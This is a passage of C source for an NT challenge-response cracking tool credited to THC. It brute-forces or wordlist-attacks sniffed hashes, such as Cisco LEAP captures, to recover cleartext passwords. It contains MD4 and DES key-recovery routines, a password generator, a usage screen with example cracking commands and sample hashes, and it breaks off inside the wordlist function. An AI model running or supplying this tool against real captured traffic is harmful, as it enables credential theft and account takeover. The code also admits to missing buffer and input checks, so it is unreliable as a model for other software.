/* -------------------------------------------------------------------------------------------------------------

	NT Challenge Response Attack Tool bad coded by DeX7er '03 (dexter@thc.org) Version 0.1
	======================================================================================
	
	Download location: The Hackers Choice (www.thc.org)
	
	You can use this tool to reverse NtChallengeResponseHashes to clear text passwords e.g 
	sniffed Cisco LEAP Passwords. 
	
	See -h for usage. This code is POC and comes without any warranty, use it on your own risk.
	
	Dependencies: OpenSSL Devel Libs e.g openssl-0.9.7-devel
	
	Compile: gcc -o filename filename.c -lssl -D_FILE_OFFSET_BITS=64 -D_LARGEFILE_SOURCE
	
	P.S. yep, I don't do much error, nor buffer, nor format string checkings, so feel free to attack yourself.
		But again, it's POC, so don't bother me with security patches

----------------------------------------------------------------------------------------------------------------

	License:
	-------------------------------------------------------------------------
	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.
	
	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.
	
	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
	
	Parts of the MD4 functions are under the following RSA License:
	------------------------------------------------------------------------- 
	RSA Data Security, Inc., MD4 message-digest algorithm
 
	Copyright (C) 1990-2, RSA Data Security, Inc. All rights reserved.
	License to copy and use this software is granted provided that it
	is identified as the "RSA Data Security, Inc. MD4 Message-Digest
	Algorithm" in all material mentioning or referencing this software
	or this function.
	License is also granted to make and use derivative works provided
	that such works are identified as "derived from the RSA Data
	Security, Inc. MD4 Message-Digest Algorithm" in all material
	mentioning or referencing the derived work.
	RSA Data Security, Inc. makes no representations concerning either
	the merchantability of this software or the suitability of this
	software for any particular purpose. It is provided "as is"
	without express or implied warranty of any kind.
	These notices must be retained in any copies of any part of this
	documentation and/or software.

--------------------------------------------------------------------------------------------------------------------
*/

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>	
#include <unistd.h>
#include <netinet/in.h>
#include <openssl/ssl.h>
#include <openssl/evp.h>

#define S11 3
#define S12 7
#define S13 11
#define S14 19
#define S21 3
#define S22 5
#define S23 9
#define S24 13
#define S31 3
#define S32 9
#define S33 11
#define S34 15

//#define PARANOID		// uncomment it if you want alphabet input checking against allowed characters
					// usually it makes not much sense to do that

#define MAXPWDLENGTH 	31
#define MAXUSERLINE		32+16+48+1

#define MAX_STR_LENGTH	1000

/* F, G and H are basic MD4 functions. */
#define F(x, y, z) (((x) & (y)) | ((~x) & (z)))
#define G(x, y, z) (((x) & (y)) | ((x) & (z)) | ((y) & (z)))
#define H(x, y, z) ((x) ^ (y) ^ (z))

/* ROTATE_LEFT rotates x left n bits. */
#define ROTATE_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))

/* FF, GG and HH are transformations for rounds 1, 2 and 3 */
/* Rotation is separate from addition to prevent recomputation */
#define FF(a, b, c, d, x, s, round) {(a) += F ((b), (c), (d)) + (x); (a) = ROTATE_LEFT ((a), (s));/*print_vars((a),(b),(c),(d),(x),(s),(round));*/}
#define GG(a, b, c, d, x, s, round) {(a) += G ((b), (c), (d)) + (x) + (UINT4)0x5a827999; (a) = ROTATE_LEFT ((a), (s));/*print_vars((a),(b),(c),(d),(x),(s),(round));*/}
#define HH(a, b, c, d, x, s, round) {(a) = (a) + H ((b), (c), (d)) + (x) + (UINT4)0x6ed9eba1;(a) = ROTATE_LEFT ((a), (s));/*print_vars((a),(b),(c),(d),(x),(s),(round));*/}

#define ALLOWED_CHARS		" abcdefghijklmnopqrstuvwxyz����ABCDEFGHIJKLMNOPQRSTUVWXYZ���1234567890._-!/~"	
	
// Structs and Types
typedef struct {
	u_int		a[255]; 
	u_char 		*pwd;
	u_char 		*cmpstr;
} PWD;

typedef unsigned long int UINT4;	

typedef struct {
	u_char username[32];
	u_char challenge[8];
	u_char DESHash1[8];
	u_char DESHash2[8];
	u_char DESHash3[8];
} USER;

//globals
u_int pwdlength=0;
u_int alphalength=0;
u_int slen=0;
u_char output=0,check=0,found=0;
u_char *username;
char *PrgName;
u_char *allowed_alphabet = ALLOWED_CHARS;
u_int   allowed_alphalength;

int checkinput(u_char *allowed_alphabet, u_int allowed_alphalength, u_char *input, u_int inputlen) {
	
	u_int i;
	u_char *p;
	
	for(i=0; i < inputlen; i++) {
		p = (u_char *) memchr(allowed_alphabet,input[i],allowed_alphalength);
		if (p == NULL) {
			printf("Error ASCII:0x%02x(%c) not allowed !\n",input[i],input[i]);
			return(EXIT_FAILURE);
		}
	}
	return(EXIT_SUCCESS);
}

// up to 8 Byte Power Function without math.h
unsigned long long bigpow(unsigned val, unsigned pow)   
{       unsigned long long ret_val = 1;
        unsigned i;
        for(i = 0; i < pow; i++)
                ret_val *= val;
	    //printf("%d ^ %d = %llu\n",val,pow,ret_val);
		return(ret_val);
}

// String to Hex Conversion
void StrToHex(unsigned char *cpString, unsigned int nSizeString,unsigned char *cpHexValue,unsigned int uSizeHexValue ) 
{
int i,x,y;
unsigned char hex[nSizeString];
	
//printf("\nInput Challenge String= %s SizeString=%d SizeHexval=%d",cpString,nSizeString,uSizeHexValue);	
x = 0;
y = 0;	
	
for (i = 0;i < nSizeString; i++)
	{
		switch ( cpString[i] )
		{
			case '0' :
				hex[i] = 0;
				break;
			case '1' :
				hex[i] = 1;
				break;
			case '2' :
				hex[i] = 2;
				break;
			case '3' :
				hex[i] = 3;
				break;
			case '4' :
				hex[i] = 4;
				break;
			case '5' :
				hex[i] = 5;
				break;
			case '6' :
				hex[i] = 6;
				break;
			case '7' :
				hex[i] = 7;
				break;
			case '8' :
				hex[i] = 8;
				break;
			case '9' :
				hex[i] = 9;
				break;			
			case 'a' :
			case 'A' :
				hex[i] = 0x0A;
				break;
			case 'b' :
			case 'B' :
				hex[i] = 0x0B;
				break;
			case 'c' :
			case 'C' :
				hex[i] = 0x0C;
				break;
			case 'd' :
			case 'D' :
				hex[i] = 0x0D;
				break;
			case 'e' :
			case 'E' :
				hex[i] = 0x0E;
				break;
			case 'f' :
			case 'F' :
				hex[i] = 0x0F;
				break;
			case ' ' :
			case '-' :
			case ':' :
			case '\t':
				continue;
			default:
				printf("\nError: %c is not a hexvalue \n\n",cpString[i]);
				exit(EXIT_FAILURE);
		}
		
		if (x % 2) // every odd value (1,3,5,..) 
			{
			if ( y >= uSizeHexValue ) { printf("\nError: Buffer too small \n\n"); exit(EXIT_FAILURE); }  	// Protect Buffer				
			cpHexValue[y] = hex[i] | (hex[i-1]<<4);	// last low nibble OR with high nibble (shift to high)
			y++;
			}
		x++;
	}
	if ( y <  uSizeHexValue ) { printf("\nError: Buffer bigger than value\n\n"); exit(EXIT_FAILURE); }	// value too short ?
}

// Usage Function
void usage() {
	long long maxnumber;
	maxnumber = bigpow(2,8*sizeof(long long)) -1;
	printf("\n");
	printf("NTChallengeResponse Attack Tool written by DeX7er '03 (dexter@thc.org) Ver.0.1\n\n");
	printf("You will always get the latest version and other cool stuff at www.thc.org    \n\n");
	printf("You can use this tool to reverse NtChallengeResponse hashes to clear text       \n");
	printf("passwords e.g sniffed Cisco LEAP Passwords. See -h for usage.                   \n");
	printf("This code is Proof of Concept(POC) and comes without any warranty, use it on    \n");
	printf("your own risk.\n\n");
	printf("This program is free software; you can redistribute it and/or modify it under   \n");
	printf("the terms of the GNU General Public License as published by the Free Software   \n");
	printf("Foundation; either version 2 of the License, or (at your option) any later      \n");
	printf("version.\n\n");
	printf("Usage: %s [-l <Password length>] [-a <Alphabet string>] \n",PrgName);
	printf("[-w <Alphabet string>] [-b <filename>] [-f <filename>] [-u <filename>]         \n");
	printf("[-t <NtChallengeResponse>][-c <challenge>] [-p refix][-v] [-o]                \n\n");
	printf("         -l  password length (max. 15)\n");
	printf("         -a  alphabet (the characters that should be used to build the password)\n");
	printf("         -w  alphabet input with wildcars: a-z; A-Z; 0-9                        \n");
	printf("         -f  use a wordlist file for password cracking instead of the alphabet  \n");
	printf("             generator(Pwd length max. 15 characters).                          \n"); 
	printf("             (without -l, -a or -f the default filename 'wordlist.txt' is used) \n");
	printf("         -b  bruteforce attack against pre-compiled binary password file        \n");
	printf("             (generated with passwords_convert2bin)                             \n");
	printf("         -u  userlist (ASCII Format: USERNAME CHALLENGE NTCHALLENGERESPONSE)    \n");
	printf("         -t  sniffed NT Challenge Response Hash (24 hexdigits) following formats\n");
	printf("             are supported:\n"); 
	printf("             \"FFFF...\",\"FF FF\"...,\"FF-FF...\",\"ffff...\",\"ff ff\"...,    \n");
	printf("             \"ff-ff...\",\"ff:ff...\"                                          \n");
	printf("             (e.g. cut'n paste from ethereal (all blanks, '-' and ':' are       \n");
	printf("             ignored)                                                           \n");
	printf("         -c  challenge. The 8 byte random value that is used to calculate the NT\n");
	printf("             Challenge Response. Input format is the same like for the -t       \n");
	printf("             option. Default value, if not set, is 'deaddeaddeaddead'.          \n");
	printf("         -p  prefix for password generation (password = [prefix]+[generated     \n");
	printf("             combinations]                                                      \n");
	printf("         -v  check number of combinations, ask before starting brute force      \n");
	printf("             attack and verbose output                                          \n");
 	printf("         -o  output to stdout (show all generated pwd combinations (only for    \n");
	printf("             debugging))                                                      \n\n");
	printf("max. number of combinations = %llu\n\n",maxnumber);
	printf("Hint: The way in which order the passwords are generated, depends on the order  \n");
	printf("      of your input.The algorithm is a number system algorithm,so your alphabet \n");
	printf("      characters are the number system members. E.g.:                           \n");
	printf("-a 01  -l 3 means the passwords are generated like this: 000,001,010,011,100,...\n");
	printf("-a abc -l 3 means the passwords are generated like this: aaa,aab,aac,aba,abb,...\n");
	printf("-a cba -l 3 means the passwords are generated like this: ccc,ccb,cca,cbc,cbb,...\n\n");
	printf("Example for Password = 'awctlr' with alphabet generator:                        \n");
	printf("%s -l 6 -a abcdefghijklmnopqrstuvwxyz -t 34f208583cda2e6674749fa08fff18663fb75c01c6537082 -c 102db5df085d3041 -v\n\n",PrgName);
	printf("Example for Password = 'cisco123' with a ASCII wordlist file 'wordlist.txt':    \n");
	printf("%s -f wordlist.txt -t 1ef803cbfb06a09867f5ebf56b04f7a036954f13b81896cc -c 102db5df085d3041\n\n",PrgName);
	printf("Example for an ASCII wordlist file 'wordlist.txt' and userlist file             \n");
	printf("'userlist.txt':\n");
	printf("%s -f wordlist.txt -u userlist.txt\n\n",PrgName); 
	printf("Example for an pre-compiled passwordlist file 'wordlist.bin' and a userlist file\n");
	printf("'userlist.txt', using the default challenge                                     \n");
	printf("%s -b wordlist.bin -u userlist.txt\n\n",PrgName);
	printf("Example for a userlist compared with generated passwords starting with          \n");
	printf("cisco+[nnn] where nnn are numbers from 0-9\n");
	printf("%s -u userlist.txt -p cisco -l 3 -w 0-9\n\n",PrgName);
	exit(1);
}

// Print hexadecimal values stored in bs of length n
void print_hex(unsigned char *bs, unsigned int n)
{
	int i;
	
	for (i = 0; i < n; i++)
		printf("%02x",bs[i]);
}

int getuser(USER *user, char *filename) {
	
	static FILE *fpFilename;
	u_char line[MAXUSERLINE];
	u_char *sPtr;
	u_int i=0;
	
	if(fpFilename == NULL) {
		if( filename == NULL ) filename = "userlist.txt";
		if(check) printf("Using file: %s as userlist file\n\n",filename);
		if((fpFilename = fopen(filename, "r")) == NULL ) { printf("\nError: File error\n\n"); usage(); }	
	}
		
	while(fgets(line,MAXUSERLINE,fpFilename) != NULL) {
		if(strlen(line) == 1) return(EXIT_SUCCESS);
		sPtr = strtok(line,"\n\t ");
		while(sPtr != NULL) {
			if(i==0) strncpy(user->username,sPtr,31);user->username[31] = '\0'; 
			if(i==1) StrToHex(sPtr,16,user->challenge,sizeof(user->challenge)); 
			if(i==2) {
				StrToHex(sPtr   ,16,user->DESHash1,sizeof(user->DESHash1));
				StrToHex(sPtr+16,16,user->DESHash2,sizeof(user->DESHash2));
				StrToHex(sPtr+32,16,user->DESHash3,sizeof(user->DESHash3));
			}
			sPtr = strtok(NULL,"\n\t ");
			i++;
		}
		if(i != 3) { 
			printf("Error: Wrong format of userfile: %s. \n%d fields defined per line, we expected 3.\n\n",filename,i);
			exit(0);
		}
		i=0;
		return(-2);
	}
	
	fclose(fpFilename);
	fpFilename=NULL;
	
	return(EXIT_SUCCESS);
}

// Decodes input (unsigned char) into output (UINT4). Assumes len is a multiple of 4. 
static void Decode (UINT4 *output, unsigned char *input, unsigned int len)
{
unsigned int i, j;

for (i = 0, j = 0; j < len; i++, j += 4)
 	output[i] = ((UINT4)input[j]) | (((UINT4)input[j+1]) << 8) | (((UINT4)input[j+2]) << 16) | (((UINT4)input[j+3]) << 24);
}

// Print vars
void print_vars(UINT4 a,UINT4 b,UINT4 c,UINT4 d, UINT4 x, UINT4 S, u_char *round) {
	
	printf("%s ",round);
	printf("abcd = ");
	print_hex((char *)&a,4);printf(" ");
	print_hex((char *)&b,4);printf(" ");
	print_hex((char *)&c,4);printf(" ");
	print_hex((char *)&d,4);printf(" ");
	printf("x = "); print_hex((char *)&x,4);printf(" ");
	printf("S = "); print_hex((char *)&S,4);printf("\n");
}

// calculate the md4 hash
unsigned char *md4(unsigned char *str,unsigned char *md4hashvalue) {
	
	UINT4 A = 0x67452301;
	UINT4 B = 0xefcdab89;
	UINT4 C = 0x98badcfe;
	UINT4 D = 0x10325476;
		
	UINT4 a = A, b = B, c = C, d = D;
	
	UINT4 x[16];
	
	unsigned char block[64] = { 0,0,0,0,0,0,0,0,0,0,    // yep, calloc(64,sizeof(char)) works also;
								0,0,0,0,0,0,0,0,0,0,	// but the heap is mutch, mutch slower ...
								0,0,0,0,0,0,0,0,0,0,
								0,0,0,0,0,0,0,0,0,0,
								0,0,0,0,0,0,0,0,0,0,
								0,0,0,0,0,0,0,0,0,0,
								0,0,0,0 };
								
	// quick'n dirty padding, works only up to 31 character input (Pwd length) ,but should be enough for us ..
	if(slen > 30) { printf("\nError: Password too long\n");usage(); }
	memcpy(block,str,slen);
	block[slen] = 0x80;
	block[56] = slen * 8;  
								
	Decode (x, block, 64);
	
	/* Round 1 */
	FF (a, b, c, d, x[ 0], S11,"R1 01:"); 			/* 1 */
	FF (d, a, b, c, x[ 1], S12,"R1 02:"); 			/* 2 */
	FF (c, d, a, b, x[ 2], S13,"R1 03:"); 			/* 3 */
	FF (b, c, d, a, x[ 3], S14,"R1 04:"); 			/* 4 */
	FF (a, b, c, d, x[ 4], S11,"R1 05:"); 			/* 5 */
	FF (d, a, b, c, x[ 5], S12,"R1 06:"); 			/* 6 */
	FF (c, d, a, b, x[ 6], S13,"R1 07:"); 			/* 7 */
	FF (b, c, d, a, x[ 7], S14,"R1 08:"); 			/* 8 */
	FF (a, b, c, d, x[ 8], S11,"R1 09:"); 			/* 9 */
	FF (d, a, b, c, x[ 9], S12,"R1 10:"); 			/* 10 */
	FF (c, d, a, b, x[10], S13,"R1 11:"); 			/* 11 */
	FF (b, c, d, a, x[11], S14,"R1 12:"); 			/* 12 */
	FF (a, b, c, d, x[12], S11,"R1 13:"); 			/* 13 */
	FF (d, a, b, c, x[13], S12,"R1 14:"); 			/* 14 */
	FF (c, d, a, b, x[14], S13,"R1 15:"); 			/* 15 */
	FF (b, c, d, a, x[15], S14,"R1 16:"); 			/* 16 */
	
	/* Round 2 */
	GG (a, b, c, d, x[ 0], S21,"R2 17:"); 			/* 17 */
	GG (d, a, b, c, x[ 4], S22,"R2 18:"); 			/* 18 */
	GG (c, d, a, b, x[ 8], S23,"R2 19:"); 			/* 19 */
	GG (b, c, d, a, x[12], S24,"R2 20:"); 			/* 20 */
	GG (a, b, c, d, x[ 1], S21,"R2 21:"); 			/* 21 */
	GG (d, a, b, c, x[ 5], S22,"R2 22:"); 			/* 22 */
	GG (c, d, a, b, x[ 9], S23,"R2 23:"); 			/* 23 */
	GG (b, c, d, a, x[13], S24,"R2 24:"); 			/* 24 */
	GG (a, b, c, d, x[ 2], S21,"R2 25:"); 			/* 25 */
	GG (d, a, b, c, x[ 6], S22,"R2 26:"); 			/* 26 */
	GG (c, d, a, b, x[10], S23,"R2 27:"); 			/* 27 */
	GG (b, c, d, a, x[14], S24,"R2 28:"); 			/* 28 */
	GG (a, b, c, d, x[ 3], S21,"R2 29:"); 			/* 29 */
	GG (d, a, b, c, x[ 7], S22,"R2 30:"); 			/* 30 */
	GG (c, d, a, b, x[11], S23,"R2 31:"); 			/* 31 */
	GG (b, c, d, a, x[15], S24,"R2 32:"); 			/* 32 */
	
	/* Round 3 */
	HH (a, b, c, d, x[ 0], S31,"R3 33:");			/* 33 */
	HH (d, a, b, c, x[ 8], S32,"R3 34:"); 			/* 34 */
	HH (c, d, a, b, x[ 4], S33,"R3 35:"); 			/* 35 */
	HH (b, c, d, a, x[12], S34,"R3 36:"); 			/* 36 */
	HH (a, b, c, d, x[ 2], S31,"R3 37:"); 			/* 37 */
	HH (d, a, b, c, x[10], S32,"R3 38:"); 			/* 38 */
	HH (c, d, a, b, x[ 6], S33,"R3 39:"); 			/* 39 */
	HH (b, c, d, a, x[14], S34,"R3 40:"); 			/* 40 */
	HH (a, b, c, d, x[ 1], S31,"R3 41:"); 			/* 41 */
	HH (d, a, b, c, x[ 9], S32,"R3 42:"); 			/* 42 */
	HH (c, d, a, b, x[ 5], S33,"R3 43:"); 			/* 43 */
	HH (b, c, d, a, x[13], S34,"R3 44:"); 			/* 44 */
	HH (a, b, c, d, x[ 3], S31,"R3 45:"); 			/* 45 */
	HH (d, a, b, c, x[11], S32,"R3 46:"); 			/* 46 */
	HH (c, d, a, b, x[ 7], S33,"R3 47:"); 			/* 47 */
	HH (b, c, d, a, x[15], S34,"R3 48:");			/* 48 */
	
	A += a;
	B += b;
	C += c;
	D += d;
	
	// some magic typecasts :)
	*(UINT4 *)  md4hashvalue     = A;
	*(UINT4 *) (md4hashvalue+4)  = B;
	*(UINT4 *) (md4hashvalue+8)  = C;
	*(UINT4 *) (md4hashvalue+12) = D;
	
	return(md4hashvalue);
}

// Password Generator Function 
char *givepwd(char *alpha,u_int alphalength,u_int pwdlength, PWD *i) {
	u_int n;
	
	for(n = 0; n < pwdlength; n++) { 
		i->pwd[pwdlength-(n + 1)] = alpha[ i->a[n] ];		
		}
	i->a[0]++;															// inc lowest number
	if(i->a[0] >= alphalength) i->a[0] = 0; 							// make shure a[0] gets not too big
																		// overflow to lowest number in system			
	for(n = 1; n < pwdlength; n++) {
		if(!strncmp(&i->pwd[pwdlength-n],&i->cmpstr[pwdlength-n],n)) { 	// end in numbersystem reached ? -> inc. number
			i->a[n]++;												   	// e.g dec-system:last number xx19; next = xx20
			if(i->a[n] >= alphalength) i->a[n] = 0;  					// make shure a[n] gets not too big
		}
	}
	return(i->pwd);	
}

u_char *DESParityCorrection(u_char *c, u_char *cc)
{
	unsigned int i;
	unsigned int parity;
	
	memset(cc,0,8);  // for sure. delete it if you are sure that cc is zero
	
	cc[0]  = c[0];
	cc[1]  = (c[1] >> 1) & 0x7e; 
	cc[2]  = (c[2] >> 2) & 0x3e; 
	cc[3]  = (c[3] >> 3) & 0x1e; 
	cc[4]  = (c[4] >> 4) & 0xfe; 
	cc[5]  = (c[5] >> 5) & 0xfe; 
	cc[6]  = (c[6] >> 6) & 0xfe;
	
	cc[1]  |= ((c[0] & 1)   << 7);
	cc[2]  |= ((c[1] & 3)   << 6);
	cc[3]  |= ((c[2] & 7)   << 5);
	cc[4]  |= ((c[3] & 15)  << 4);
	cc[5]  |= ((c[4] & 31)  << 3);
	cc[6]  |= ((c[5] & 63)  << 2);	
	cc[7]  |= ((c[6] & 127) << 1);	
		
	for(i=0; i < 9; i++) {
		parity = (((cc[i] & 128) >> 7) + ((cc[i] & 64) >> 6) + ((cc[i] & 32) >> 5) 
				 +((cc[i] & 16 ) >> 4) + ((cc[i] & 8 ) >> 3) + ((cc[i] & 4 ) >> 2) + ((cc[i] & 2) >> 1));
		
		(parity % 2) ? (cc[i] &= 0xfe) : (cc[i] |= 0x01);
	}
	
	return(cc);
}

unsigned char *DESencrypt( unsigned char *cpData, int uDataLength, unsigned char *cpDesKey,unsigned char *cpDesHash)
{
	EVP_CIPHER_CTX ctx;
	int templen,encdatalen;
    unsigned char *DESHelpBuffer;		// help buffer because the DES output could be twice the input buffer 
										// because of internal padding,etc of OpenSSL Libary
	if ( (DESHelpBuffer = (unsigned char *) malloc(16)) == NULL) exit(0);
	
	int d1,d2,d3;
	encdatalen = 0;
	if ( (d1 = EVP_EncryptInit(&ctx,EVP_des_ecb(),cpDesKey,NULL)) != 1 ) exit(0);	
	if ( (d2 = EVP_EncryptUpdate(&ctx,DESHelpBuffer,&encdatalen,cpData,uDataLength)) != 1 ) exit(0);	
	if ( (d3 = EVP_EncryptFinal(&ctx,&DESHelpBuffer[encdatalen],&templen)) != 1 ) exit(0);
	encdatalen += templen; 
	memcpy(cpDesHash,DESHelpBuffer,8);

	free(DESHelpBuffer);
 	return (cpDesHash);
}
// find S2 in S1 and substitute it with S3 
char *strsub(char *S1, char *S2, char *S3) {
	
	u_int a;
	char *psHelp;
	char *psNewStr = NULL; 
	u_int psNewStrLen = 0;

#ifdef PARANOID	
	int check_S1;
	int check_S2;
	int check_S3;
#endif	
	
	// some basic tests
	if(strlen(S1) > MAX_STR_LENGTH) { printf("S1 too long\n"); exit(EXIT_FAILURE); }
	if(strlen(S2) > MAX_STR_LENGTH) { printf("S2 too long\n"); exit(EXIT_FAILURE); }
	if(strlen(S3) > MAX_STR_LENGTH) { printf("S3 too long\n"); exit(EXIT_FAILURE); }
	
#ifdef PARANOID		
	check_S1 = checkinput(allowed_alphabet, allowed_alphalength, S1, strlen(S1));
	if( check_S1 == EXIT_FAILURE ) { printf("S1 includes illegal characters\n"); exit(EXIT_FAILURE); }
	check_S2 = checkinput(allowed_alphabet, allowed_alphalength, S2, strlen(S2));
	if( check_S2 == EXIT_FAILURE ) { printf("S2 includes illegal characters\n"); exit(EXIT_FAILURE); }
	check_S3 = checkinput(allowed_alphabet, allowed_alphalength, S3, strlen(S3));
	if( check_S3 == EXIT_FAILURE ) { printf("S3 includes illegal characters\n"); exit(EXIT_FAILURE); }
#endif
	
	if((psHelp = strstr(S1,S2)) != NULL ) {
		a = psHelp - S1;
		psNewStrLen = strlen(S1)+strlen(S3)-strlen(S2)+1;
		if ((psNewStr = malloc(psNewStrLen)) == NULL ){ printf("Malloc failed\n"); exit(EXIT_FAILURE); }
		memcpy(psNewStr,S1,a);
		memcpy(psNewStr+a,S3,strlen(S3));
		memcpy(psNewStr+a+strlen(S3),psHelp+strlen(S2),strlen(psHelp+strlen(S2)));
		psNewStr[psNewStrLen-1] = '\0';
	}
	else {
		//printf("Ret=%s\n",S1);
		return(S1);
	}
	S1 = realloc(S1,strlen(psNewStr)+1);
	if(S1 == NULL) { printf("Realloc failed\n"); exit(EXIT_FAILURE); }
	strncpy(S1,psNewStr,strlen(psNewStr));
	S1[strlen(psNewStr)] = '\0';
	
	free(psNewStr);
	
	//printf("Ret=%s\n",S1);
	return(S1);
}

char *getalpha(char *alpha) {
	
	char *az = "abcdefghijklmnopqrstuvwxyz";
	char *AZ = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char *num = "0123456789";
	char *input;
	
	if(strlen(alpha) > MAX_STR_LENGTH) { printf("Alphabetstring too long\n"); exit(EXIT_FAILURE); }	
	if ((input = malloc(strlen(alpha)+1)) == NULL ) { printf("Malloc failed\n"); exit(EXIT_FAILURE); }
	strncpy(input,alpha,strlen(alpha));
	input[strlen(alpha)] = '\0';
	
	input = strsub(input,"a-z",az);
	input = strsub(input,"A-Z",AZ);
	input = strsub(input,"0-9",num);

	return(input);
}

u_int PwdGenMD4finder(u_char *alpha, u_char *challenge, u_char *DesOrg1,u_char *DesOrg2,u_char *DesOrg3, u_char *prefix) { 

	u_int  i,m,n;

	u_char md4hashvalue[16];
	u_char DES3_last2[4];
	u_char md4hashvalue1_fixed_key[8];
	u_char md4hashvalue2_fixed_key[8];
	u_char DesHash[8];
	u_char DesKey[8];
	u_char DesKey3[4] = { 0x01, 0x40, 0x80, 0xc1 }; // all possible combinations for the third byte of the MD4 hash (only the first 2 bits are variable) 
	
	long long rounds;
	
	PWD sPwd;
	
	if((alphalength == 0) || (pwdlength == 0)) { 
		printf("Error: no wordlist , no pwdgen option set\n"); usage();
	}
	if(bigpow(alphalength,pwdlength) >= bigpow(2,8*sizeof(long long)-1) + (bigpow(2,8*sizeof(long long)-1)-1)) { 
		printf("Error: Power Function overflow\n");usage();
	}  
	
	if(check) {	// -c set ?
		printf("\nThat means %llu combinations (Go -> hit enter) or Ctrl-C" ,bigpow(alphalength,pwdlength));
		getchar();
		printf("\n");
	}
	
	// reserve mem and init pwdstring and alphabet variables (arrays are slightly faster than heap pointers)
	u_char apwd[pwdlength];
	sPwd.pwd = apwd;
	u_char aalpha[alphalength];
	memcpy(aalpha,alpha,alphalength);
	alpha = aalpha;
	
	// prepare unicode transformation
	u_int indexlen = strlen(prefix);
	slen = (pwdlength+indexlen)*2;
	u_char str[slen];
	memset(str,0,slen); // for sure
	
	// remove the parity and find the MD4 hash
	for(i = 0; i < 4; i ++) {
		for(m = 0; m < 256; m++) {
			for(n = 0; n < 256; n++) {
				
				DesKey[0] = m;
				DesKey[1] = n;
				DesKey[2] = DesKey3[i];
				DesKey[3] = DesKey[4] = DesKey[5] = DesKey[6] = DesKey[7] = 0x01;

				DESencrypt( challenge, 8, DesKey ,DesHash);

				if ( ! memcmp(DesHash,DesOrg3,8) ) {  
					//printf("Ok. Hash "); /*print_hex(DesKey,8)*/;printf("found !\n");
					
					memcpy(DES3_last2,DesKey,3);
					
					if(check) {
						printf("Input of third DES block (last two octets of the MD4 Pwd Hash with parity correction and padding):");
						print_hex(DES3_last2,3);printf("01 01010101\n");
					}
					DES3_last2[0] &= 0xfe;
					DES3_last2[0] |= ((DES3_last2[1] >> 7) & 1);
					
					DES3_last2[1] <<= 1; 
					DES3_last2[1] &= 0xfc; 
					DES3_last2[1] |= ((DES3_last2[2] >> 6) & 3);
					
					if(check) {
						printf("Last two octets of MD4 Password Hash without DES parity correction and padding:");
						print_hex(DES3_last2,2);printf("\n");
					}
					n = 256;n = 256;i = 4;
					found=1;
				}
			}
		}
	}
	
	if(!found) { printf("No matching value found. Check your input ...\n"); usage(); } 
	
	if(check) {	// -c set ?
		printf("\n(Go -> hit enter) or Ctrl-C");
		getchar();
		printf("\n");
	}
	
	// Password Generator initalization
	for(m = 0; m < pwdlength; m++) str[m] = 0x00;
	
	for(m = 0; m < pwdlength; m++) sPwd.a[m] = 0;
	
	for(m = 0; m < pwdlength; m++) sPwd.pwd[m] = alpha[0];
	sPwd.pwd[pwdlength] = '\0';
	
	u_char acmpstr[pwdlength];
	sPwd.cmpstr = acmpstr;
	
	for(m = 0; m < pwdlength; m++) sPwd.cmpstr[m] = alpha[alphalength-1];
	sPwd.cmpstr[pwdlength] = '\0';
	
	// Main password generating and cracking Loop
	for(rounds=0;rounds < bigpow(alphalength,pwdlength); rounds++) {
		givepwd(alpha,alphalength,pwdlength,&sPwd);
		
		// -- if a prefix is set
		for(m = 0; m < indexlen; m++) {
			*(((u_short *) str) + m) = *(u_char *)(prefix+m);  
		}	
		
		// quick'n dirty unicode transformation (abcd -> ab00cd00)
		for(m = 0; m < pwdlength; m++) {
			*((((u_short *) str) + indexlen) + m) = *(u_char *)(sPwd.pwd+m);  
		}
		
		md4(str,md4hashvalue);
		
		if( *(u_short *) (md4hashvalue+14) == *(u_short *)DES3_last2 ) {
			
			DESParityCorrection(md4hashvalue, md4hashvalue1_fixed_key);
			DESParityCorrection(md4hashvalue+7, md4hashvalue2_fixed_key);
			
			if(check) {
				printf("trying DES1: ");
				print_hex(md4hashvalue1_fixed_key,8)  ;printf(" DES2: ");
				print_hex(md4hashvalue2_fixed_key,8)  ;printf(" Last two bytes: ");
				print_hex(md4hashvalue+14,2);printf(" ");
				printf("  Pwd=%s%s  Count: %llu  \n",prefix,sPwd.pwd,rounds);
			}
			
			DESencrypt( challenge, 8, md4hashvalue1_fixed_key ,DesHash);
			
			if(*(u_long *)DesOrg1 == *(u_long *)DesHash) { 
				if(check) { printf("DES1: ");print_hex(DesHash,8);printf("(match !!) \n"); }
				
				DESencrypt( challenge, 8, md4hashvalue2_fixed_key ,DesHash);
				if(*(u_long *)DesOrg2 == *(u_long *)DesHash) {
					if(check) {
						printf("DES2: ");print_hex(DesHash,8);printf("(match !!)\n");
						printf("%llu words generated ...\n",rounds);
					}
					printf("\nMatching Password = [%s%s] ",prefix,sPwd.pwd);
					if(username != NULL) printf(" Username: %s\n\n",username);
					else printf("\n\n");
					return(EXIT_SUCCESS);
				}
			}
		}
		
		if(output) {
			print_hex(md4hashvalue,16);printf(" ");
			print_hex(md4hashvalue+14,2);
			printf("  String=%s\n",sPwd.pwd);
		}
	}
	
	// Password cracking -> nothing found
	printf("\nBad luck. Nothing found. %llu words compared ...\n\n",rounds);
	
	return(EXIT_FAILURE);
}

// Use Wordlist file 
u_int WordlistMD4finder(u_char *filename, u_char *challenge, u_char *DesOrg1,u_char *DesOrg2,u_char *DesOrg3) {
	
	long long rounds=0;
	PWD sPwd;
	FILE *fpFilename;
	u_char line[MAXPWDLENGTH+1];
	
	sPwd.pwd = line;

	u_int  i,m,n;

	u_char md4hashvalue[16];
	u_char DES3_last2[4];
	u_char md4hashvalue1_fixed_key[8];
	u_char md4hashvalue2_fixed_key[8];
	u_char DesHash[8];
	u_char DesKey[8];
	u_char DesKey3[4] = { 0x01, 0x40, 0x80, 0xc1 }; // all possible combinations for the third byte of the MD4 hash (only the first 2 bits are variable) 
	
	// remove parity bits and find the last two octets of the MD4 hash for the given DES Hash
	for(i = 0; i < 4; i ++) {
